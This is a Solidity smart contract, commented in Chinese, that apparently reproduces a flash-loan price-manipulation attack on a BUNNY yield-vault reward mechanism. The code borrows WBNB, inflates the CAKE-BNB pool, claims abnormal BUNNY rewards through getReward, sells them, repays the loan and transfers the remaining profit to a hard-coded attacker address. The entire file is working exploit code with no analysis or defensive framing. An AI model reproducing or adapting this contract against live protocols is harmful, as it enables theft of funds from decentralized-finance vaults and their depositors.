pragma solidity ^0.6.6;

import './IPancakeERC20.sol';
import './IVaultFliptoFlip.sol';

import './UniswapV2Library.sol';
import './IUniswapV2Router02.sol';
import './IUniswapV2Router01.sol';
import './IUniswapV2Pair.sol';
import './IUniswapV2Factory.sol';
import './IERC20.sol';

contract Arbitrage {

    //攻击者地址（我的地址）
    address addressAttacker = 0x8E4Cf799B68F01f3A54c7154EeB1D94cc26fBCe9;

    //代币地址
    address addressBunny = 0xA6D8F2C13bCF110Bb6A4bC6106B91924DC6af377;
    address addressWbnb = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd;
    address addressCake = 0x7f5C7233553ea53666397bDCa6D4d21152394783;
    address addressBusd = 0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee;

    //池子地址
    address addressAttackPool = 0x19772904658D025C195980644da6FD34a2f80d93;//受攻击的池子CAKE-BNB
    address addressFlashPool = 0x0ac98433b581F469b07c8c6384c8D41C5aD73EC0;//闪电贷资金来源池BNB-BUSD
    address addressMonetizePool = 0x3Ad45a76920f2E6Dc3A46fFb1ACDf8fa69379c0E;//资金变现池BUNNY-BNB

    //操作池子进行代币兑换的路由地址
    address addressRouter = 0x17B40C1C9227c5e25f2046133516A18f77218828;

    //收益聚合器地址
    address addressVaultFlipToFlip = 0x0F63b41FDd4D4DEe44197fd1ADC6524dcb52506d;

    //代币兑换所需要的参数
    uint constant deadline = 1661169530;

    //接口
    IUniswapV2Router02 public pancakeRouter;

    //攻击事件监测
    event FlashSwapSuccess(uint);
    event FlashAttackSuccess(uint);

    //攻击开始函数
    function startFlashAttack() external {

        //进行闪电贷
        address token0=addressWbnb;
        address token1=addressBusd;
        uint amount0=5*1e17;//0.5BNB
        uint amount1=0;
        require(IUniswapV2Pair(addressFlashPool).token0()==addressWbnb,"1");
        require(IUniswapV2Pair(addressFlashPool).token1()==addressBusd,"2");

        IUniswapV2Pair(addressFlashPool).swap(amount0,amount1,address(this),bytes('not empty'));


    }
    receive() payable external {}

    function pancakeCall(address _sender,uint _amount0,uint _amount1,bytes calldata _data) external {

        //闪电贷回调，查看是否已经闪电贷成功
        uint wbnbBalance=IERC20(addressWbnb).balanceOf(address(this));
        require(wbnbBalance==5*1e17,"3");
        emit FlashSwapSuccess(wbnbBalance);

        //调用swapExactTokensForTokens到CAKE-BNB中大幅膨胀BNB的数量
        address[] memory path = new address[](2);
        path[0] = addressWbnb;
        path[1] = addressCake;
        IERC20(addressWbnb).approve(addressRouter, 10000*1e18);//代币授权兑换
        IUniswapV2Router01(addressRouter).swapExactTokensForTokens(wbnbBalance,0,path,address(this),deadline);


        //调用getReward获得异常的Bunny奖励
        IVaultFliptoFlip(addressVaultFlipToFlip).getReward();

        //查看攻击所得的bunny并记录
        uint bunnyBalance=IERC20(addressBunny).balanceOf(address(this));
        emit FlashSwapSuccess(bunnyBalance);

        //变现
        path[0] = addressBunny;
        path[1] = addressWbnb;
        IERC20(addressBunny).approve(addressRouter,1e70);//代币授权兑换
        IUniswapV2Router01(addressRouter).swapExactTokensForTokens(bunnyBalance,0,path,address(this),deadline);

        //查看所得变现的wbnb，计算是否足够还账
        wbnbBalance=IERC20(addressWbnb).balanceOf(address(this));
        require(wbnbBalance>5.5*1e17,"not enought attack money");//检查所得的bnb是否大于0.55，准备还0.55

        //归还闪电贷
        IERC20(addressWbnb).approve(addressFlashPool,10000*1e18);
        IERC20(addressWbnb).transfer(addressFlashPool,5.5*1e17);

        //剩下的wbnb打回给攻击者
        IERC20(addressWbnb).approve(addressAttacker,10000*1e18);
        IERC20(addressWbnb).transfer(addressAttacker,IERC20(addressWbnb).balanceOf(address(this)));


    }

    //攻击合约预先存入
    function depositToVaultCakeBnb() external{
        IPancakeERC20(addressAttackPool).approve(addressVaultFlipToFlip,10000*1e18);
        IVaultFliptoFlip(addressVaultFlipToFlip).depositAll();
    }

    function depositToAttackContract() external{
        uint AttackerBalance=IPancakeERC20(addressAttackPool).balanceOf(msg.sender);
        IPancakeERC20(addressAttackPool).transferFrom(msg.sender,address(this),AttackerBalance);
    }

    function getAttackerCakeBnbBalance() external view returns (uint){
        return IPancakeERC20(addressAttackPool).balanceOf(msg.sender);
    }

    //此函数为万一出现问题的取出操作（另加，没必要）
    function withdrawCakdBnb() external{
        uint CakeBnbBalance=IPancakeERC20(addressAttackPool).balanceOf(address(this));
        IPancakeERC20(addressAttackPool).approve(addressAttacker,10000*1e18);
        IPancakeERC20(addressAttackPool).transfer(addressAttacker,CakeBnbBalance);

    }
}